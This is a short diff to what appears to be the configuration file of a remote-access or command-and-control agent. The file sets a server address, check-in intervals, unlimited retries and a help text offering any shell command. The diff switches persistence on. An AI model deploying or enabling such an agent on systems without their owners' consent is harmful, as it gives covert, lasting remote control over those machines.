@@ -2,7 +2,7 @@ SERVER = "http://localhost:5000"
 HELLO_INTERVAL = 60
 IDLE_TIME = 60
 MAX_FAILED_CONNECTIONS = -1
-PERSIST = False
+PERSIST = True
 TLS_VERIFY = True
 HELP = """
 <any shell command>
